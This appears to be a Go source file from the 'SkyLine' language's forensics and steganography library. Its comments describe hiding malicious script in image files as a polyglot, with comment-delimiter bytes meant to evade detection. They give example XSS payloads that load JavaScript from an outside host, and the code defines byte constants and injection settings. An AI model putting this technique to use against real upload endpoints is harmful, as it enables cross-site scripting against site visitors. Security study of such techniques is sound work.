//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	This file contains all information for the SkyLine standard library //   _____ _       __    _              _____                     _
//	such as the math, io, IoT, ECP, Socket, Web, HTTP and other various //  |   __| |_ _ _|  |  |_|___ ___ ___ |   __|___ ___ ___ ___ ___|_|___ ___
//	library content types. This code section defines a sub unit under a //  |__   | '_| | |  |__| |   | -_|___ |   __| . |  _| -_|   |_ -| |  _|_ -|
//	primary unit. This means that this section is under neath all of the//  |_____|_,_|_  |_____|_|_|_|___|    |__|  |___|_| |___|_|_|___|_|___|___|
//	primary units that define the functions to register the sub func's  //            |___|
//////////////////////////////////////////////////////////////////////////
//
// This library defines all forensics related functions and libraries which allow you to dissect, inject or mess around with images or files in some shape or form while also inspecting
//
// specific file formats such as PNG, JPEG, GIF, BMP, ELF, PE, EXE and etc files.
//
// ----- File defines : Models for the existing library
//
//:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
//
// This path of (n) contains all digital forensics based functions for images, files, memory, binary files and much more among that list.
//
// n = StandardLibraryExternal/Forensics
//
// This type of module contains much more files and information for general digital forensics and steganography. This includes functions and
// types as well as parsers that can look up signatures in images, verify unifentified files, pull data from files and images, extract signatures
// and uses the syscall table to read and write data to images with an option that allows you to encrypt and then inject data into an image. Currently
// this library only works with mainly PNG images but also has support for JPG/JPEG images and as far as general injection goes it works with most images
// which are common that includes BMP, JPG, JPEG, PNG, GIF, WEBP, WebM and other various file formats.
//
//
// - Date of start : Wed 01 Mar 2023 02:18:32 PM EST
//
// - File name     : SkyLine_Image_Forensics_ControllInject.go
//
// - File contains : All controller functions for injection and writers that use standard parsing techniques. Functions within this code are used to parse and inject payloads
//					 Such as `<script src=//web.form.gov> </script>`
// 					 Techniques are explained below
//
//
// The purpose of this controller function is to hide remote and malicous code within an image but encode it to
// where it will execute when the data is parsed
//
// or ran through something such as a parser on the other end of something like a web server.
// The following example breaks down the hex code injected into the image
//
// as a set of bytes. There will also be a minimal graphic showing this example and writing it
// to code explaining each bit of it
//
//
// The follwoing false (psudeo) code describes the bytes like so
//
// CONST Start  = []byte{0x2f, 0x2a};
// CONST Middle = []byte{0x2a, 0x2f, 0x3d, 0x31, 0x3b};
// CONST End    = []byte{\x3b};
//
// These bytes define the mid point of the injection, the end of the injection and the start of the injection.
//
// Start                    	  ; \x2f and \x2a are representations for the START of a multi line comment
// Middle (first)                 ; \x2a and \x2f are representations for the END of a multi line comment
// Middle (Mid section / End)     ; \x3d and \x31 and \x3b represents a = to 1, this expression sets the variable = to 1.
// End                            ; THis represents the end of the injection
//
// PARSING AND UNDERSTANDING WHY THESE PARTS EXIST
//
//
// Start       : Start exists because hiding the code in a multi line comment from the start and the end will
//               allow offensive experts to bypass certain detection systems or
//               overwatch workers. Ofc this is still seeable but it makes it easier to hide than just plain out there
//
// Middle END  : This section exists because it allows the attacker to execute the code that comes after the comment
//
// END         : This will define the delimiter to indicate the end of the payload that has been injected into the file
//
//
// Techniques like this make it easy to take control of servers by exploiting XSS like the following way
//
// Situation : A server allows you to upload an image, the image is not sanitized and the web server does not
//             properly handle content types
//
//
//
// -----------------------------------------------
// |  Vulnerable server allows a user or host    |
// |  to upload an image that is not checked or  |
// |  sanitized before being uploaded to the     |
// |  server                                     |
// -----------------------------------------------
// 					|
// 					|
//                  |---------------------------------------------|
// 					| Attacker hides a script tag in the image    |
// 					| containing a website holding remote JS code |
//                  | like alert('xss')                           |
//                  |---------------------------------------------|
// 										|
// 										|
// 										|-----------------------------------------------|
// 										| The payload injected into the file looks like |
// 										| <sCrIpt src=//BLOGSITE.IO.com></ScRipT>       |
//                                      |-----------------------------------------------|
// 														_____|
// 														|
// 														|
// 														|
// 														|
// 														|
// 						-----------------------------------------------------------
// 						| When the user visits the page or endpoint which the     |
// 						| file with the payload was uploaded to, this code then   |
// 						| gets executed because the content types are not handled |
// 						| correctly within the server thus the code executes      |
// 						-----------------------------------------------------------
//
//
// This type of attack is easy to attack but also very hard to work with well manually on the spot anyway
//
// this is why I designed this language, to make concepts like this way easier than they were before.
//
//
package SkyLin_Backend_SkyStandardLib_Image_Forensics

var (
	//:::::::::::::::::::::::::::::::::::::::
	//:: Start : Payload injection start at
	//:::::::::::::::::::::::::::::::::::::::
	Payload_Image_1_Start = []byte{
		0x2f, 0x2a,
	}

	//:::::::::::::::::::::::::::::::::::::::
	//:: Middle : Payload injection at middle
	//:::::::::::::::::::::::::::::::::::::::
	Payload_Image_1_Middle = []byte{
		0x2a, 0x2f,
		0x3d, 0x31,
		0x3b,
	}

	//:::::::::::::::::::::::::::::::::::::::
	//:: End : Payload injection end
	//:::::::::::::::::::::::::::::::::::::::
	Payload_Image_1_End = []byte{
		0x3b,
	}

	//:::::::::::::::::::::::::::::::::::::::
	//:: ZIP byte signature for detection
	//:::::::::::::::::::::::::::::::::::::::
	ZIP_File_Signature = []byte{
		'\x4b',
		'\x03',
		'\x04',
	}

	//:::::::::::::::::::::::::::::::::::::::
	//:: BMP Base encoding and byte payload
	//:::::::::::::::::::::::::::::::::::::::
	BMP_Base_Payload = []byte{
		0x42, 0x4d, 0x1e, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x1a,
		0x00, 0x00, 0x00, 0x0c, 0x00,
		0x00, 0x00, 0x01, 0x00, 0x01,
		0x00, 0x01, 0x00, 0x18, 0x00,
		0x00, 0x00, 0xff, 0x00,
	}

	//:::::::::::::::::::::::::::::::::::::::
	//:: PNG Base encoding and byte payload
	//:::::::::::::::::::::::::::::::::::::::
	PNG_Base_Payload = []byte{
		0x89, 0x50, 0x4E,
		0x47, 0x0D, 0xA,
		0x1A, 0x0A,
	}

	//:::::::::::::::::::::::::::::::::::::::
	//:: PNG Signatures
	//:::::::::::::::::::::::::::::::::::::::
	PNG_SIG_1 = "PNG"                     // Signature 1
	PNG_SIG_2 = "89504E470D0A1A0A"        // Signature 2
	PNG_PAT_3 = "89 50 4E 47 0D 0A 1A 0A" // Pattern 3
	SIG_END   = "IEND"                    // Signature 3 | IEND ( End of image )

	// Structure keys
	CreateImageSettings ImageCreation_Settings
)

type (
	//:::::::::::::::::::::::::::::::::::::::
	//:: Settings struct for image generation
	//:::::::::::::::::::::::::::::::::::::::
	ImageCreation_Settings struct {
		PixelWidth  string // Pixel width of image
		PixelHeight string // Pixel height of image
		Output      string // Output file name
	}

	//:::::::::::::::::::::::::::::::::::::::
	//:: PNG Library Structures
	//:::::::::::::::::::::::::::::::::::::::

	PNG_MetaData struct {
		Offset int64
		Chunk  PNG_Image_Chunk
	}

	PNG_Image_Chunk struct {
		CRC       uint32
		FieldData []byte
		Type      uint32
		Size      uint32
	}

	PNG_Image_Header struct {
		HEADER uint64
	}
	//:::::::::::::::::::::::::::::::::::::::
	//:: PNG Forensics settings structure
	//:::::::::::::::::::::::::::::::::::::::
	Png_Module_Settings struct {
		Key             string // Encryption key if any
		Decode          bool   // Decode payload before injection
		Encode          bool   // Encode payload before injection
		OutputFile      string // Output file resulting in the input file being injected
		InputFile       string // Input file to inject
		FileMode        int64  // File mode of created output file from resulting injection
		ImageOffset     int64  // Offset to inject at
		Payload         string // Payload to inject
		InjectableChunk string // Chunk to inject at
	}
)
